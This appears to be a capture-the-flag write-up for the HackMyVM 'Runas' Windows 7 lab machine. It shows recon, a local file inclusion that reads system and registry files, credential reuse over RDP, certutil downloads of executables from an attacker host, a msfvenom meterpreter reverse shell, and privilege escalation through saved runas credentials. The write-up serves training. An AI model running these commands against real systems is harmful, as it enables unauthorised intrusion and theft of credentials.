# Runas

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.85:80
Open 10.0.2.85:135
Open 10.0.2.85:139
Open 10.0.2.85:445
Open 10.0.2.85:3389
Open 10.0.2.85:5357
Open 10.0.2.85:49152
Open 10.0.2.85:49153
Open 10.0.2.85:49154
Open 10.0.2.85:49155
Open 10.0.2.85:49156
Open 10.0.2.85:49157
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.85
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Apache httpd 2.4.57 ((Win64) PHP/7.2.0)
|_http-title: Index of /
|_http-server-header: Apache/2.4.57 (Win64) PHP/7.2.0
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Service
| ssl-cert: Subject: commonName=runas-PC
| Issuer: commonName=runas-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-13T15:47:14
| Not valid after:  2026-04-14T15:47:14
| MD5:   f421:ea22:7c29:4957:5197:f680:49bf:10ff
| SHA-1: 3a2b:e62c:61a1:2dd2:fafd:e4e2:0c1d:2a0b:91c1:0c5e
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQJAKhZsFyjZFD822SnrH82jANBgkqhkiG9w0BAQUFADAT
| MREwDwYDVQQDEwhydW5hcy1QQzAeFw0yNTEwMTMxNTQ3MTRaFw0yNjA0MTQxNTQ3
| MTRaMBMxETAPBgNVBAMTCHJ1bmFzLVBDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA8ESLR+9MZ9LFDa/n64tpQaIX9XhY0JD3wlCQVwEsh5ac7kUSdvjk
| I8hZqn22a12d1QBzHeB5Hs6PMaNJIPrGvMdVx1SqCSzs7HjNgbio78thPcrypjwM
| 42mG2TFADeDpQOO8BB1J/87i1DLzRZhIvkRBXMef8pGcoWZCv/x9rM32fycTAQuy
| ozWasrvPo7ULQ93QciKpa1ieqGPBEqy4vB3K0v9Xe0gASbMlvJ0ip5fU+zXobmvF
| e6VWMzecxVYXhxhC3qoyPSrMu/dwQqpXnxtwAiDOWfet/HVX9BVw51t+tqaf0t8J
| 5+D41Zx4fZ4vJ6vf9kZckFtWSr2sYHsZOwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAMblGhCTL/dy
| PVcQbqrfmXAhJpdJUfGyyiLdWZXHuFkUVcZ4TvRnP4jTGUqQUdT1jaWNbajlZuoh
| //y9HzMY0/PCeIsjkLgSSiKTgAMH28Lsj5Vb3sVdyUhBqbnrJbJsfopnrTUX3sAl
| MvKDi+MQ607cIHcrjQn7YuuW9fHLPZuLgRV/sdtJYQo0V2gZ9qfE1U0A26aHBa7c
| jSymiGHJqq9CIeWmbpJcqXuqsozshu2zJHACx8bB+hx/WWU8wHYV6dYv+DDOEVPL
| rUTRtY6Z66CSaj0KckIYSDu63t5DEkcmQMwPTYsq9wCvEusNhQK4BIgXM0p4IoQn
| mAnfWjBdu1g=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-14T15:50:06+00:00; 0s from scanner time.
5357/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49156/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: RUNAS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25024/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59719/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 8896/udp): CLEAN (Timeout)
|   Check 4 (port 29286/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-14T15:50:01
|_  start_date: 2025-10-14T15:47:13
|_clock-skew: mean: -44m59s, deviation: 1h29m59s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: RUNAS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:66:53:da (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   RUNAS-PC<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   RUNAS-PC<20>         Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   08:00:27:66:53:da:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: runas-PC
|   NetBIOS computer name: RUNAS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-14T18:50:01+03:00
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/runas/writeup.png)

![writeup-1.png](/assets/pentest/hackmyvm/runas/writeup-1.png)

### LFI

```bash
└─$ curl 'http://10.0.2.85/index.php?file=C:\Windows\System32\drivers\etc\hosts' -s | htmlq -t pre
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
```

```bash
└─$ ffuf -u 'http://10.0.2.85/index.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -fs 429,425,631 | tee ffuf.log
C:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 35ms]
C:/Windows/system32/config/regback/sam [Status: 200, Size: 627, Words: 84, Lines: 20, Duration: 6ms]
C:/Windows/system32/config/regback/security [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 9ms]
C:/Windows/system32/config/regback/system [Status: 200, Size: 630, Words: 84, Lines: 20, Duration: 6ms]
C:/Windows/system32/config/regback/software [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 9ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 58608, Words: 8247, Lines: 599, Duration: 13ms]
C:/Windows/System32/inetsrv/config/applicationHost.config [Status: 200, Size: 79253, Words: 12108, Lines: 821, Duration: 22ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 86ms]
C:/Windows/win.ini      [Status: 200, Size: 1042, Words: 103, Lines: 46, Duration: 108ms]
c:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 81ms]
c:/PHP/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 149ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 6ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 946, Words: 171, Lines: 34, Duration: 7ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19622, Words: 8783, Lines: 303, Duration: 11ms]
c:/WINDOWS/setupact.log [Status: 200, Size: 25712, Words: 2474, Lines: 314, Duration: 14ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 108084, Words: 8722, Lines: 1171, Duration: 32ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 1973, Words: 539, Lines: 45, Duration: 71ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4760, Words: 774, Lines: 97, Duration: 65ms]
```

```bash
└─$ awk '{print($1)}' ffuf.log | tr 'A-Z' 'a-z' | sort | uniq | tee files.txt
c:/php/php.ini
c:/windows/setupact.log
c:/windows/system32/config/regback/sam
c:/windows/system32/config/regback/security
c:/windows/system32/config/regback/software
c:/windows/system32/config/regback/system
c:/windows/system32/drivers/etc/hosts
c:/windows/system32/drivers/etc/lmhosts.sam
c:/windows/system32/drivers/etc/networks
c:/windows/system32/drivers/etc/protocol
c:/windows/system32/drivers/etc/services
c:/windows/system32/inetsrv/config/applicationhost.config
c:/windows/system32/inetsrv/config/schema/aspnet_schema.xml
c:/windows/windowsupdate.log
c:/windows/win.ini
```

```bash
└─$ while IFS= read -r file; do
    filename="$(basename "$file")"
    echo "[*] Downloading: $file -> fuzz_download/$filename"
    if curl -s "http://10.0.2.85/index.php?file=$file" | htmlq -t pre >"fuzz_download/$filename"; then
        echo "[+] Success: $file";
    else
        echo "[-] Failed: $file";
    fi
done < files.txt
```

```bash
└─$ grep 'runas' . -Rain
./win.ini:1:; MD5-runas-b3a805b2594befb6c846d718d1224557
./windowsupdate.log:175:2024-10-06      21:46:34:752     960    a38     Handler Attempting to create remote handler process as runas-PC\Administrator in session 2
./windowsupdate.log:277:2024-10-06      21:48:01:846     960    a38     Handler Attempting to create remote handler process as runas-PC\Administrator in session 2
./windowsupdate.log:472:2024-10-06      21:57:06:269     960    85c     Handler Attempting to create remote handler process as runas-PC\Administrator in session 1
./windowsupdate.log:830:2024-10-08      17:44:22:963     968    13c     Handler Attempting to create remote handler process as runas-PC\Administrator in session 1
```

## RDP

![writeup-2.png](/assets/pentest/hackmyvm/runas/writeup-2.png)

Successful credentials
```bash
└─$ netexec smb 10.0.2.85 -u 'runas' -p 'yakuzza'
SMB         10.0.2.85       445    RUNAS-PC         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:RUNAS-PC) (domain:runas-PC) (signing:False) (SMBv1:True)
SMB         10.0.2.85       445    RUNAS-PC         [+] runas-PC\runas:yakuzza
```

::: tip Creds
`runas:yakuzza`
:::

Usually in CTF you get ability to connect via WINRM, but not in this case. RDP is open and we can probe it.

If you use Reminna make sure  to change TLS Security Level to 0

![writeup-3.png](/assets/pentest/hackmyvm/runas/writeup-3.png)

```bash
# Alternative
└─$ xfreerdp /v:10.0.2.85 /u:runas /p:yakuzza /cert-ignore /sec:rdp
```

### User.txt

![writeup-4.png](/assets/pentest/hackmyvm/runas/writeup-4.png)

```bash
HMV{User_Flag_Was_A_Bit_Bitter}
```

## Privilege Escalation

Open terminal in RDP and upload 
```powershell
└─$ cp /opt/scripts/enum/peass/winPEASany.exe wp.exe
└─$ serve
---
> cd %TEMP%
> certutil.exe -urlcache -f http://10.0.2.15/wp.exe wp.exe
> .\wp.exe
```

Failed

![writeup-5.png](/assets/pentest/hackmyvm/runas/writeup-5.png)

Upload meterpreter
```powershell
> certutil.exe -urlcache -f http://10.0.2.15/rev.exe rev.exe
> .\rev.exe
```

```bash
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o rev.exe
└─$ msfconsole -q
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.0.2.15
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Sending stage (203846 bytes) to 10.0.2.85
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.85:49165) at 2025-10-14 16:13:04 -0400

meterpreter > getuid
Server username: runas-PC\runas
```

The box name is a dead giveaway for a hint
- [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault)
- [https://juggernaut-sec.com/runas/](https://juggernaut-sec.com/runas/#WinPEAS\_–\_FAIL)
- [https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas](https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas)

::: info Note
If `winpeas` fails, try `SeatBelt.exe`!
:::

```bash
C:\Users\Public\Music>cmdkey /list
Current credentials stored:
    Target: Domain:interactive=RUNAS-PC\Administrator
    Type: Domain Password
    User: RUNAS-PC\Administrator
```

```powershell
C:\Users\Public\Music>runas /env /noprofile /savecred /user:runas-pc\Administrator "C:\Users\Public\Music\rev.exe"
[*] Sending stage (203846 bytes) to 10.0.2.85

C:\Users\Public\Music>exit

meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > sessions
  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  1         meterpreter x64/windows  runas-PC\runas @ RUNAS-PC  10.0.2.15:4444 -> 10.0.2.85:49165 (10.0.2.85)
  3         meterpreter x64/windows                             10.0.2.15:4444 -> 10.0.2.85:49170 (10.0.2.85)

msf exploit(multi/handler) > sessions 3
meterpreter > getuid
[-] The "getuid" command requires the "stdapi" extension to be loaded (run: `load stdapi`)
meterpreter > load stdapi
meterpreter > getuid # No Response
meterpreter > shell
C:\Users\Public\Music>whoami
runas-pc\administrator
```

### Root.txt

```
C:\Users\Public\Music>type \Users\Administrator\Desktop\root.txt
HMV{Username_Is_My_Hint}
```

